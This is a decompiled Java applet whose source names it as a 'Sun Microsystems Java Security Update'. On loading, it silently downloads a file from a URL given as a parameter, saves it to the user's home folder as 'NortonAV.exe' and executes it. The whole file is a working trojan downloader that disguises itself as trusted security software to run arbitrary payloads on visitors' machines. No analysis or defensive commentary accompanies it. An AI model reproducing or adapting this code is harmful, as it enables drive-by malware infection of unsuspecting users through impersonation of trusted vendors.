import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.awt.Graphics;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sun_Microsystems_Java_Security_Update_6 extends Applet
{
    @Override
    public void paint(final Graphics graphics) {
        graphics.drawString(this.getParameter("file"), 20, 20);
    }
    
    @Override
    public void init() {
        final String concat = System.getProperty("user.home").concat("\\NortonAV.exe");
        System.out.println(concat);
        this.download(this.getParameter("file"), concat);
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
    }
    
    public void download(final String s, final String s2) {
        BufferedOutputStream bufferedOutputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {
            ex.printStackTrace();
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex2) {
                System.out.println(ex2);
            }
        }
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex3) {
                System.out.println(ex3);
            }
        }
    }
}
